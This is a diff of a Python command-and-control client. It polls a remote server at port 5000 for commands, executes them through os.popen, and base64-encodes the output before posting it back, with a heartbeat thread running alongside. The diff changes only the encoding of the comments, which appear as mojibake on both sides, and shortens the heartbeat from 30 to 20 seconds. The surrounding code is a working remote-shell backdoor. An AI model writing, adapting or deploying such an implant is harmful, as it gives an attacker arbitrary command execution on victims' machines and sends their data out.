@@ -11,14 +11,14 @@ import base64
 def receive(id):
 	url="http://ip:5000/c2client?cmd="+str(id)
 	#print url
-	# ½ÓÊÕ´ıÖ´ĞĞÃüÁî
+	# æ¥æ”¶å¾…æ‰§è¡Œå‘½ä»¤
 	try:
 		while True:
 			
 			s1= requests.get(url, timeout=10)
 			#print s1.status_code
 			if s1.status_code == 200:
-				#ÕıÔòÆ¥ÅäÄÚÈİ
+				#æ­£åˆ™åŒ¹é…å†…å®¹
 				command= s1.content
 				#print command
 				return command
@@ -33,7 +33,7 @@ def send(result):
 	url="http://ip:5000/c2client?results="#+base64.b64encode(str(r1))
 	data = {"results": base64.b64encode(str(r1))}
 	#print url
-	# ÃüÁîÖ´ĞĞ½áÊøµÄ»ØÏÔ·¢ËÍ
+	# å‘½ä»¤æ‰§è¡Œç»“æŸçš„å›æ˜¾å‘é€
 	try:
 		while True:
 			s1= requests.post(url,data=data,timeout=30)
@@ -46,7 +46,7 @@ def send(result):
 
 
 def cmd(command):
-	#Ö´ĞĞÏµÍ³ÃüÁî²¢»ñÈ¡»ØÏÔ
+	#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è·å–å›æ˜¾
 	try:
 		output = os.popen(command)
 		result = output.read()
@@ -65,7 +65,7 @@ def heartbeats():
 	while True:
 		url="http://ip:5000/c2heartbeat?client="+str(time.time())
 		url0="http://ip:5000/c2heartbeat?control="+str(time.time())
-		# Ã¿30Ãë·¢Ò»´ÎĞÄÌø°ü
+		# æ¯20ç§’å‘ä¸€æ¬¡å¿ƒè·³åŒ…
 		try:
 			while True:
 				s0= requests.get(url0, timeout=5)
@@ -75,11 +75,11 @@ def heartbeats():
 				time.sleep(1)
 		except:
 			return
-		time.sleep(30)
+		time.sleep(20)
 
 
 if __name__ == '__main__':
-	#Æô¶¯ĞÄÌøÏß³Ì
+	#å¯åŠ¨å¿ƒè·³çº¿ç¨‹
 	t = threading.Thread(target=heartbeats)
 	t.start()
 	i=0
@@ -88,14 +88,14 @@ if __name__ == '__main__':
 		#print i
 		time.sleep(1)
 		try:
-			#½ÓÊÕÃüÁî
+			#æ¥æ”¶å‘½ä»¤
 			cmd1=receive(i)
 			if cmd1!= None:
-				#Ö´ĞĞÃüÁî
+				#æ‰§è¡Œå‘½ä»¤
 				result1=cmd(cmd1)
 				#print result1
 				if result1 != None:
-					#·¢ËÍ½á¹û
+					#å‘é€ç»“æœ
 					send(result1)
 		except:
 			pass
